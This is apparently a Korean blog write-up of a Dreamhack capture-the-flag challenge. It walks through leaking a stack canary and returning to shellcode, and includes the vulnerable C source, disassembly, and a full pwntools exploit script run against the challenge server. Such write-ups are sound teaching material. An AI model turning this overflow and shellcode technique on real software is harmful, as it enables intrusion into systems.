---
layout: post
title: [Dreamhack] Return To Shell
subtitle: Dreamhack Return To Shell
categories: Pwnable
tags: [Pwnable, dreakhack, Canary, Pentest]
---

**본 문제는 Dreamhack을 통해서 풀어 보실 수 있습니다.**

**해답을 이해하며 생각을 해보면서 풀이 해보시길 바랍니다.**

## 문제 내용

문제는 <a href = "https://dreamhack.io/wargame/challenges/">dreamhack.io</a>를 들어가시면 확인할 수 있습니다.

<p align="center">
<img src ="https://user-images.githubusercontent.com/78135526/187843280-49f962bb-bb02-4c99-ac77-25461b47cec7.jpg" width = 500>
</p>

이 문제는 Stack Canary 교육 과정에 포함되어 있어 풀이는 Canary 우회이며, ShellCode로 Return 시키는 문제입니다.

<p align="center">
<img src ="https://user-images.githubusercontent.com/78135526/187847693-8e04b845-ce55-49df-8eea-3b1baba8ce09.jpg" width = 500>
</p>

**r2s** 파일은 64bit의 ELF이며, x86-64 아키텍처이므로 추후 스크립트에는 `context.arch = "amd64"`가 필요한 것을 알 수 있다.

<p align="center">
<img src ="https://user-images.githubusercontent.com/78135526/187848080-c7d23b3a-b889-4ec1-b3b0-2724dcf17db6.jpg" width = 350>
</p>

`checksec`를 통해서 Canary가 있는 것을 알 수 있다.

## 문제 풀이

```C
// r2s.c
#include <stdio.h>
#include <unistd.h>

void init() {
  setvbuf(stdin, 0, 2, 0);
  setvbuf(stdout, 0, 2, 0);
}

int main() {
  char buf[0x50];

  init();

  printf("Address of the buf: %p\n", buf);
  printf("Distance between buf and $rbp: %ld\n",
         (char*)__builtin_frame_address(0) - buf);

  printf("[1] Leak the canary\n");
  printf("Input: ");
  fflush(stdout);

  read(0, buf, 0x100);
  printf("Your input is '%s'\n", buf);

  puts("[2] Overwrite the return address");
  printf("Input: ");
  fflush(stdout);
  gets(buf);

  return 0;
```

소스 코드에서도 Canary Leak을 활용하고, Return Address를 Overwrite하라고 명시해주었습니다. 

```C
read(0, buf, 0x100);
```

해당 구문에서 buf는 총 0x50의 바이트를 선언했지만 더욱 큰 0x100까지 read하므로 **Canary Leak**이 가능합니다.

### pwndbg

스택 프레임이 어떻게 구성되는지 확인해보겠습니다.

```armasm
0x00000000000008d1 <+4>:     sub    rsp,0x60
0x00000000000008d5 <+8>:     mov    rax,QWORD PTR fs:0x28
0x00000000000008de <+17>:    mov    QWORD PTR [rbp-0x8],rax
```

* 스택은 총 0x60(96byte)를 할당하고 **Canary**는 [rbp-0x8] 위치에 있는 것을 알 수 있습니다. 하지만 `char buf[0x50];`라 했으므로 buf는 총 80byte를 차지하고 있다.

```armasm
0x0000000000000956 <+137>:   lea    rax,[rbp-0x60]
0x000000000000095a <+141>:   mov    edx,0x100
0x000000000000095f <+146>:   mov    rsi,rax
0x0000000000000962 <+149>:   mov    edi,0x0
0x0000000000000967 <+154>:   call   0x730 <read@plt>

# read(0, buf, 0x100);
```

* `buf`는 총 80byte인데 `read()`로 읽어들이는 부분은 256byte이기에 Canary Leak이 확실하게 가능하다. 이로써 그려본 스택은 아래와 같다.

<p align="center">
<img src ="https://user-images.githubusercontent.com/78135526/187845943-2a4f5713-5bc3-4c04-b8a3-bf915a936326.jpg" width = 350>
</p>

### pwntools

**buf, dummy**에 Shellcode와 부족한 Dummy를 채우고 Canary Leak을 통해 **Canary**값 넣고 **SFP** 8byte Dummy 채우고 **RET**는 Buf 주소를 넣으면 된다.

```python
from pwn import *

#p = process("./r2s")
p = remote('host3.dreamhack.games', 20609)
context.arch = "amd64"

def slog(n, m):
    return success(': '.join([n, hex(m)]))

# [1] Get information about buf
p.recvuntil('buf: ')
buf = int(p.recvline(), 16)
p.recvuntil('$rbp: ')

buf2sfp = int(p.recvline().split()[0])
buf2cnry = buf2sfp - 8

slog('buf <=> sfp', buf2sfp)
slog('buf <=> canary', buf2cnry)

# [2] Leak canary value
payload = b'A'*(buf2cnry + 1)  # (+1) because of the first null-byte
p.sendafter('Input:', payload)
p.recvuntil(payload)

cnry = u64(b'\x00'+p.recvn(7))
slog('Canary', cnry)

# [3] Exploit
SFP = b'S' * 8
sh = asm(shellcraft.sh())
payload = sh.ljust(buf2cnry, b'A')
payload += p64(cnry)
payload += SFP
payload += p64(buf)

print(payload)
# gets() receives input until "\n" is received
p.sendlineafter('Input:', payload)
p.interactive()
```

<p align="center">
<img src ="https://user-images.githubusercontent.com/78135526/187855183-5a2d1651-f614-42d5-941b-0d7c75517702.jpg" width = 450>
</p>

이렇게 해당 flag를 받아올 수 있다.